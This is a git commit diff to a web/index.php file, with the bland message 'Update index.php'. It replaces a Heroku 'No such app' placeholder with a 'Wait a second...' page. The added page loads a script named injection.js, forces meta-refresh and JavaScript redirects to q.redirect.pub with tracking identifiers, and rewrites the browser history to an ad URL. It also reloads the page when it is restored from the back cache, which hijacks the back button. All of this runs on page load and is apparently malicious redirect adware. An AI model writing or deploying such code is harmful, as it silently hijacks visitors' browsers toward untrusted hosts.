1a660c9bc0627e6eeb87f33efda2d7233f823a45
sanernecro <sanernecro@gmail.com>
2016-11-19 19:15:53 +0200

    Update index.php

--- web/index.php
+++ web/index.php
@@ -1,30 +1,58 @@
-<?php
-header('HTTP/1.0 503 Service Unavailable');
-?>
-
 <!DOCTYPE html>
-	<html>
-	  <head>
-		<meta charset="utf-8">
-		<title>No such app | Heroku</title>
-		<link rel="shortcut icon" type="image/x-icon" href="https://www.herokucdn.com/favicon.ico">
-		<style media="screen">
-		  html,body,iframe {
-			margin: 0;
-			padding: 0;
-		  }
-		  html,body {
-			height: 100%;
-			overflow: hidden;
-		  }
-		  iframe {
-			width: 100%;
-			height: 100%;
-			border: 0;
-		  }
-		</style>
-	  </head>
-	  <body>
-		<iframe src="//www.herokucdn.com/error-pages/no-such-app.html"></iframe>
-	  </body>
-	</html>
+<html>
+<head>
+<meta http-equiv="content-type" content="text/html; charset=utf-8">
+<title>Wait a second...</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta name="robots" content="noindex,nofollow">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<!-- Google Analytics --><script>
+        (function (i, s, o, g, r, a, m) {
+            i['GoogleAnalyticsObject'] = r;
+            i[r] = i[r] || function () {
+                    (i[r].q = i[r].q || []).push(arguments)
+                }, i[r].l = 1 * new Date();
+            a = s.createElement(o),
+                m = s.getElementsByTagName(o)[0];
+            a.async = 1;
+            a.src = g;
+            m.parentNode.insertBefore(a, m)
+        })(window, document, 'script', '//www.google-analytics.com/analytics.js', 'ga');
+
+        ga('create', 'UA-74349022-2', 'auto');
+
+        ga('send', {
+            'hitType': 'pageview',
+            'page': '/ad/41bc9048#619'
+        });
+    </script><!-- End Google Analytics Code --><script type="text/javascript" src="/assets/js/injection.js"></script><meta http-equiv="refresh" content="0; url=http://q.redirect.pub/?utm_medium=b6391ce7c23a5787889f47d9aeaab72d8906cda3&amp;utm_campaign=q&amp;cid=a5aff29b73574c6a10b48131fb0fd7b2">
+</head>
+<body onunload="">
+<noscript>
+        <meta http-equiv="refresh" content="0; url=http://q.redirect.pub/?utm_medium=b6391ce7c23a5787889f47d9aeaab72d8906cda3&amp;utm_campaign=q&amp;cid=a5aff29b73574c6a10b48131fb0fd7b2">
+</noscript>
+<script type="text/javascript">
+    (function (w, d, l) {
+        try {
+            w.onload = function () {
+                setTimeout(function () {
+                    History.pushState({}, '', 'http://saner.decleaf.com/ad/41bc9048?d=1&l=1');
+                    l.href = 'http://q.redirect.pub/?utm_medium=b6391ce7c23a5787889f47d9aeaab72d8906cda3&utm_campaign=q&cid=a5aff29b73574c6a10b48131fb0fd7b2';
+                }, 1);
+            };
+            w.onpageshow = function (e) {
+                if (e.persisted) {
+                    l.reload();
+                }
+            };
+
+        } catch (e) {
+            History.replaceState({}, '', 'http://saner.decleaf.com/ad/41bc9048?d=1&l=1');
+            History.pushState({}, '', 'http://saner.decleaf.com/ad/41bc9048?d=1&l=1');
+
+            l.href = 'http://q.redirect.pub/?utm_medium=b6391ce7c23a5787889f47d9aeaab72d8906cda3&utm_campaign=q&cid=a5aff29b73574c6a10b48131fb0fd7b2';
+        }
+    })(window, document, location);
+</script>
+</body>
+</html>
